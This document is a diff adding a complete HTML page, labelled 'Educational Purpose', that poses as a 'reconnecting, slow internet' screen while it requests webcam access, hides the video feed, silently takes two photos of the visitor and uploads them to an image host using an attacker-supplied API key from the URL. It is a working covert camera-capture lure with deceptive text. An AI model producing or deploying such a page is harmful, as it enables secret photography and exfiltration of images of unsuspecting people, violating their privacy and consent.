@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Tool - Educational Purpose</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #000;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    video {
+      display: none;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
+      color: lime;
+    }
+  </style>
+</head>
+<body>
+  <h2 id="status"> Reconnecting please wait due to slow internet connection ...</h2>
+  <video id="video" autoplay></video>
+
+  <script>
+    const video = document.getElementById("video");
+    const status = document.getElementById("status");
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const apiKey = urlParams.get("api");
+
+    if (!apiKey) {
+      status.innerText = "❌ No API key found in URL.";
+      throw new Error("Missing API key");
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => captureAndUpload("First"), 2000); // 2 sec
+        setTimeout(() => captureAndUpload("Second"), 5000); // 5 sec
+      })
+      .catch(() => {
+        status.innerText = "❌ Camera access denied.";
+      });
+
+    function captureAndUpload(label) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL("image/png");
+
+      fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
+        method: "POST",
+        body: new URLSearchParams({
+          image: imageData.split(',')[1]
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log(`${label} photo uploaded: ${data.data.url}`);
+      })
+      .catch(err => {
+        console.error(`${label} upload failed`, err);
+      });
+    }
+  </script>
+</body>
+</html>
+
